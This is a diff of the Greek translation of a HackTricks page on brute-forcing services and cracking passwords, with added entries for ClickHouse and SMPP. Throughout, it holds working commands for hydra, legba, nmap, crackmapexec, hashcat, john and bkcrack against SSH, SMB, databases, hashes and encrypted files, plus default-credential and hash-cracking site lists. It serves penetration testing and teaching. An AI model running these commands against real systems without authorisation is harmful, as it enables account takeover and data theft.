@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Default Credentials
+## Προεπιλεγμένα Διαπιστευτήρια
 
-**Αναζητήστε στο google** για προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκιμάστε αυτούς τους συνδέσμους**:
+**Κάνε αναζήτηση στο google** για τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκίμασε αυτούς τους συνδέσμους**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **Δημιουργήστε τα δικά σας Λεξικά**
+## **Δημιούργησε τα δικά σου λεξικά**
 
-Βρείτε όσο το δυνατόν περισσότερες πληροφορίες σχετικά με τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:
+Βρες όσο το δυνατόν περισσότερες πληροφορίες για τον στόχο και δημιούργησε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:
 
 ### Crunch
 ```bash
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-Δημιουργήστε κωδικούς πρόσβασης με βάση τις γνώσεις σας για το θύμα (ονόματα, ημερομηνίες...)
+Δημιουργήστε κωδικούς βάσει των πληροφοριών που έχετε για το θύμα (ονόματα, ημερομηνίες...)
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-Ένα εργαλείο δημιουργίας λιστών λέξεων, που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων, δίνοντάς σας τη δυνατότητα να δημιουργήσετε πολλές παραλλαγές από τις δεδομένες λέξεις, δημιουργώντας μια μοναδική και ιδανική λίστα λέξεων για χρήση σχετικά με έναν συγκεκριμένο στόχο.
+Ένα εργαλείο δημιουργίας wordlist, που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων, δίνοντάς σας τη δυνατότητα να δημιουργήσετε πολλαπλές παραλλαγές από τις δοθείσες λέξεις, δημιουργώντας μια μοναδική και ιδανική wordlist για χρήση σε σχέση με έναν συγκεκριμένο στόχο.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -74,7 +74,7 @@ Finished in 0.920s.
 ```
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
-### Λίστες Λέξεων
+### Wordlists
 
 - [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 - [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
@@ -89,7 +89,7 @@ Finished in 0.920s.
 
 ## Υπηρεσίες
 
-Ταξινομημένες αλφαβητικά κατά όνομα υπηρεσίας.
+Ταξινομημένα αλφαβητικά κατά όνομα υπηρεσίας.
 
 ### AFP
 ```bash
@@ -109,11 +109,17 @@ nmap --script ajp-brute -p 8009 <IP>
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
-### Κασσάνδρα
+### Cassandra
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
 # legba ScyllaDB / Apache Casandra
 legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
+```
+### ClickHouse
+
+[bruter](https://github.com/vflame6/bruter)
+```bash
+bruter clickhouse -u default -p passwords.txt localhost:9000
 ```
 ### CouchDB
 ```bash
@@ -156,7 +162,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Για το http**s** πρέπει να αλλάξετε από "http-post-form" σε "**https-post-form**"
+Για το http**s** πρέπει να αλλάξετε από "http-post-form" σε "**https-post-form"**
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla ή (D)rupal ή (M)oodle
 ```bash
@@ -211,7 +217,7 @@ legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwor
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
 ```
-### Μόνγκο
+### Mongo
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
@@ -278,7 +284,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Για να χρησιμοποιήσετε το **oracle_login** με το **patator** πρέπει να **εγκαταστήσετε**:
+Για να χρησιμοποιήσετε **oracle_login** με **patator** πρέπει να **εγκαταστήσετε**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -368,6 +374,10 @@ nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
+### SMPP
+```bash
+bruter smpp -u smppclient1 -p passwords.txt localhost:2775
+```
 ### SMTP
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
@@ -400,13 +410,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### Αδύναμα κλειδιά SSH / Προβλέψιμος PRNG Debian
+#### Αδύναμα SSH keys / Debian προβλέψιμο PRNG
 
-Ορισμένα συστήματα έχουν γνωστά ελαττώματα στον τυχαίο σπόρο που χρησιμοποιείται για την παραγωγή κρυπτογραφικού υλικού. Αυτό μπορεί να έχει ως αποτέλεσμα μια δραματικά μειωμένη περιοχή κλειδιών που μπορεί να παραβιαστεί με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Προγεννημένα σύνολα αδύναμων κλειδιών είναι επίσης διαθέσιμα όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Ορισμένα συστήματα έχουν γνωστές αδυναμίες στον random seed που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε δραματικά μειωμένο keyspace, το οποίο μπορεί να γίνει bruteforced με εργαλεία όπως [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Προ-δημιουργημένα σύνολα weak keys είναι επίσης διαθέσιμα, όπως [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Το πρωτόκολλο κειμένου STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο μηνυμάτων που **επιτρέπει την απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες ουρών μηνυμάτων** όπως το RabbitMQ, ActiveMQ, HornetQ και OpenMQ. Παρέχει μια τυποποιημένη και αποτελεσματική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διαφόρων λειτουργιών μηνυμάτων.
+Η STOMP text protocol είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο μηνυμάτων που **επιτρέπει απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες ουρών μηνυμάτων** όπως RabbitMQ, ActiveMQ, HornetQ και OpenMQ. Παρέχει μια τυποποιημένη και αποδοτική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διαφόρων λειτουργιών μηνυμάτων.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -446,21 +456,21 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## Τοπικά
 
-### Διαδικτυακές βάσεις δεδομένων cracking
+### Online cracking βάσεις δεδομένων
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
-- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με/χωρίς ESS/SSP και με οποιαδήποτε τιμή πρόκλησης)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, και αρχεία MSOffice, ZIP, PDF...)
+- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes και hashes αρχείων)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Δείτε αυτό πριν προσπαθήσετε να κάνετε brute force σε ένα Hash.
+Ελέγξτε αυτό πριν προσπαθήσετε να brute force ένα Hash.
 
 ### ZIP
 ```bash
@@ -478,10 +488,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Γνωστή επίθεση σε zip με απλό κείμενο
+#### Known plaintext zip attack
 
-Πρέπει να γνωρίζετε το **απλό κείμενο** (ή μέρος του απλού κειμένου) **ενός αρχείου που περιέχεται μέσα** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε **τα ονόματα αρχείων και το μέγεθος των αρχείων που περιέχονται μέσα** σε ένα κρυπτογραφημένο zip εκτελώντας: **`7z l encrypted.zip`**\
-Κατεβάστε [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα των εκδόσεων.
+Πρέπει να γνωρίζετε το **plaintext** (ή μέρος του plaintext) **ενός αρχείου που περιέχεται μέσα** στο encrypted zip. Μπορείτε να ελέγξετε τα **ονόματα αρχείων και το μέγεθος των αρχείων που περιέχονται μέσα** σε ένα encrypted zip εκτελώντας: **`7z l encrypted.zip`**\
+Κατεβάστε [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα releases.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -515,7 +525,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-Για να σπάσετε έναν κωδικό ιδιοκτήτη PDF, ελέγξτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Για να crack ένα PDF Owner password δείτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -549,9 +559,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks image
+### Lucks εικόνα
 
-#### Method 1
+#### Μέθοδος 1
 
 Εγκατάσταση: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -569,7 +579,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-Ένα άλλο tutorial Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
+Ένας ακόμα οδηγός για Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
 
 ### Mysql
 ```bash
@@ -577,7 +587,7 @@ mount /dev/mapper/mylucksopen /mnt
 <USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
 dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
 ```
-### PGP/GPG Ιδιωτικό κλειδί
+### PGP/GPG Private key
 ```bash
 gpg2john private_pgp.key #This will generate the hash and save it in a file
 john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
@@ -588,14 +598,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Χρησιμοποιήστε [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και στη συνέχεια τον john
+Χρησιμοποιήστε [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και στη συνέχεια john
 
-### Open Office Pwd Protected Column
+### Open Office Στήλη προστατευμένη με κωδικό
 
-Αν έχετε ένα αρχείο xlsx με μια στήλη προστατευμένη με κωδικό πρόσβασης, μπορείτε να την αποδεσμεύσετε:
+Αν έχετε ένα αρχείο xlsx με μια στήλη προστατευμένη με κωδικό, μπορείτε να την ξεκλειδώσετε:
 
-- **Ανεβάστε το στο google drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
-- Για να **αφαιρέσετε** το **χειροκίνητα**:
+- **Ανεβάστε το στο google drive** και ο κωδικός θα αφαιρεθεί αυτόματα
+- Για να το **αφαιρέσετε** **χειροκίνητα**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -620,40 +630,40 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 hash-identifier
 > <HASH>
 ```
-### Λίστες Λέξεων
+### Wordlists
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
-- [**Seclists - Κωδικοί Πρόσβασης**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
+- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Εργαλεία Δημιουργίας Λιστών Λέξεων**
+### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Προηγμένος γεννήτορας πληκτρολογίου με ρυθμιζόμενους βασικούς χαρακτήρες, χάρτη πλήκτρων και διαδρομές.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Προηγμένος generator keyboard-walk με ρυθμιζόμενα base chars, keymap και routes.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-Διαβάστε _**/etc/john/john.conf**_ και ρυθμίστε το
+Διάβασε _**/etc/john/john.conf**_ και ρύθμισέ το
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat επιθέσεις
+#### Επιθέσεις Hashcat
 
-- **Επίθεση λίστας λέξεων** (`-a 0`) με κανόνες
+- **Wordlist attack** (`-a 0`) με κανόνες
 
-**Hashcat** έρχεται ήδη με ένα **φάκελο που περιέχει κανόνες** αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** περιλαμβάνει ήδη έναν **φάκελο που περιέχει κανόνες**, αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** επίθεση
 
-Είναι δυνατόν να **συνδυάσετε 2 λίστες λέξεων σε 1** με το hashcat.\
-Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **"world"** και **"earth"**. Οι λέξεις `helloworld` και `helloearth` θα παραχθούν.
+Είναι δυνατό να **συνδυάσετε 2 wordlists σε 1** με το hashcat.\
+Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 σειρές με τις λέξεις **"world"** και **"earth"**, τότε θα παραχθούν οι λέξεις `helloworld` και `helloearth`.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -664,7 +674,7 @@ hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
 ## hello-earth!
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
 ```
-- **Επίθεση μάσκας** (`-a 3`)
+- **Mask attack** (`-a 3`)
 ```bash
 # Mask attack with simple mask
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d
@@ -696,7 +706,7 @@ hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
 ## Use it to crack the password
 hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
 ```
-- Λίστα λέξεων + Μάσκα (`-a 6`) / Μάσκα + Λίστα λέξεων (`-a 7`) επίθεση
+- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) επίθεση
 ```bash
 # Mask numbers will be appended to each word in the wordlist
 hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
@@ -704,23 +714,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Λειτουργίες Hashcat
+#### Τρόποι λειτουργίας Hashcat
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Σπάζοντας τους Hashes του Linux - /etc/shadow αρχείο
+Cracking Linux Hashes - /etc/shadow αρχείο
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Σπάζοντας τα Hashes των Windows
+Cracking Windows Hashes
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-Σπάζοντας Κοινά Hash Εφαρμογών
+Cracking Κοινών Εφαρμογών Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
